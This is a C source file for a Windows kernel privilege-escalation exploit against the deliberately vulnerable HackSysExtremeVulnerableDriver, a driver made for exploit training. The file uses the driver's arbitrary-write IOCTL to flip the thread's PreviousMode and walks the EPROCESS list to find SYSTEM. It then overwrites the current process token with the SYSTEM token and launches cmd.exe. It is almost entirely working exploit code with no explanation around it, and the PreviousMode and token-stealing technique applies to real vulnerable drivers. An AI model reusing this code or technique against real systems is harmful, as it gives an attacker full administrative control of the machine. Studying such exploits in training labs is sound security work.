/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////// THIS EXPLOIT IS NOT PERFECT AND IT CONTAINS A THREAD THAT IS ALWAYS LOOPING /////////////////////////////////////
///////////////////////////////////// FROM MEDIUM LEVEL, LEAK KTHREAD, EPROCESS, STEAL TOKEN AND SHELL //////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include<stdio.h>
#include<Windows.h>
#include<stdint.h>
#include<stdlib.h>
#include "utils.hpp"

#define SYMBOLIC_TARGET L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_ARB_WRITE 0x22200B

typedef struct _WRITE_WHAT_WHERE {
	uint64_t What;
	uint64_t Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

void kernel_write(HANDLE hHevd, uint64_t what, uint64_t where) {
	WRITE_WHAT_WHERE writeWhatWhere;

	writeWhatWhere.What = (uint64_t)what;
	writeWhatWhere.Where = where;


	DWORD bytesReturned;
	if (DeviceIoControl(hHevd, IOCTL_ARB_WRITE, &writeWhatWhere, sizeof(WRITE_WHAT_WHERE), NULL, 0, &bytesReturned, NULL)) {
	}
	else {
		//printf("[-] Failed to send IOCTL:  0x%x\n", GetLastError());
	}



}

uint64_t kernel_read(HANDLE hHevd, uint64_t where) {
	uint64_t leak = 0;
	BYTE* write_here = (BYTE*)malloc(8);
	if (write_here == NULL) {
		printf("[-] Failed to allocate memory\n");
		CloseHandle(hHevd);
		return -1;
	}
	RtlZeroMemory(write_here, 8);

	kernel_write(hHevd, where, (uint64_t)write_here);
	leak = *(uint64_t*)write_here; // Read the data from the kernel memory


	if (write_here) {
		RtlZeroMemory(write_here, 8);
		free(write_here);
	}
	return leak;
}

int main(int argc, char** argv) {

	HANDLE hHevd = CreateFileW(SYMBOLIC_TARGET, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hHevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open device handle\n");
		return -1;
	}
	printf("[+] Device handle opened successfully\n");


	/****************************** FLIPPING PREVIOUS MODE TO 0 ***********************************/
	PVOID KTHREAD_ADDRESS = getKTHREAD();
	printf("[+] KTHREAD address: %p\n", KTHREAD_ADDRESS);
	BYTE* previous_mode_address = (BYTE*)((ULONGLONG)(ULONG_PTR)KTHREAD_ADDRESS + 0x232); 
	uint64_t previous_mode_64 = kernel_read(hHevd, (uint64_t)previous_mode_address);
	printf("[+] Previous mode address: %p\n", previous_mode_address);
	printf("[+] Previous mode value: 0x%llx\n", previous_mode_64);
	previous_mode_64 ^= 0x1; // Flip the previous mode value



	uint64_t* what = (uint64_t*)malloc(sizeof(uint64_t));
	*what = previous_mode_64;
	kernel_write(hHevd, (uint64_t)what, (uint64_t)(ULONG_PTR)previous_mode_address);
	printf("[+] Previous mode value flipped successfully\n");
	Sleep(1000);


	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (!NtWriteVirtualMemory) {
		printf("[-] Failed to get NtWriteVirtualMemory address\n");
		CloseHandle(hHevd);
		return -1;
	}
	printf("[+] NtWriteVirtualMemory address: %p\n", NtWriteVirtualMemory);


	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)0xFFFFF78000000800, (PVOID)"ABABABAB", 8, NULL);


	
	LPVOID nt_base = GetBaseAddr(L"ntoskrnl.exe");
	LPVOID hevd_base = GetBaseAddr(L"HEVD.sys");

	printf("[+] ntoskrnl.exe base address: %p\n", nt_base);
	printf("[+] hevd.sys base address: %p\n", hevd_base);

	uint64_t offset_to_EPROCESS_from_kthread = 0x220;
	uint64_t offset_to_pid_eprocess = 0x440;
	uint64_t offset_to_activeProcessLinks_eprocess = 0x448;
	uint64_t offset_to_token_eprocess = 0x4b8;


	// Offset to EPROCESS from KTHREAD
	uint64_t eprocess_address = (uint64_t)KTHREAD_ADDRESS + offset_to_EPROCESS_from_kthread;
	
	uint64_t EPROCESS = kernel_read(hHevd, eprocess_address);
	uint64_t current_eprocess = EPROCESS;

	printf("[+] EPROCESS address: 0x%llx\n", EPROCESS);
	uint64_t pid = kernel_read(hHevd, EPROCESS + offset_to_pid_eprocess);

	while (pid != 4) {
		printf("[*] Reading EPROCESS @ 0x%llx\n", EPROCESS + offset_to_activeProcessLinks_eprocess);
		ReadProcessMemory(
			GetCurrentProcess(), 
			(PVOID)(EPROCESS + offset_to_activeProcessLinks_eprocess),
			&EPROCESS, 
			sizeof(uint64_t), 
			NULL
		);
		EPROCESS -= offset_to_activeProcessLinks_eprocess;
		
		pid = kernel_read(hHevd, EPROCESS + offset_to_pid_eprocess);

	}

	printf("[+] PID for SYSTEM found!\n");
	printf("[*] EPROCESS of SYSTEM : 0x%llx\n", EPROCESS);


	uint64_t SYSTEM_TOKEN_ADDRESS = EPROCESS + offset_to_token_eprocess;
	uint64_t SYSTEM_TOKEN_VALUE = kernel_read(hHevd, SYSTEM_TOKEN_ADDRESS);
	printf("[+] SYSTEM token address: 0x%llx\n", SYSTEM_TOKEN_ADDRESS);
	printf("[+] SYSTEM token value: 0x%llx\n", SYSTEM_TOKEN_VALUE);

	uint64_t current_token_address = current_eprocess + offset_to_token_eprocess;
	uint64_t current_token_value = kernel_read(hHevd, current_token_address);
	printf("[+] Current token address: 0x%llx\n", current_token_address);
	printf("[+] Current token value : 0x%llx\n", current_token_value);

	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)current_token_address, (PVOID)&SYSTEM_TOKEN_VALUE, 8, NULL);
	printf("[+] Current token value changed to SYSTEM token value\n");

	Sleep(1000);

	previous_mode_64 ^= 0x1; // Flip the previous mode value back to original
	uint64_t* what_ = (uint64_t*)malloc(sizeof(uint64_t));
	*what_ = previous_mode_64;
	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)previous_mode_address, (PVOID)what_, 8, NULL);
	system("cmd.exe");

	
	return -1;
}
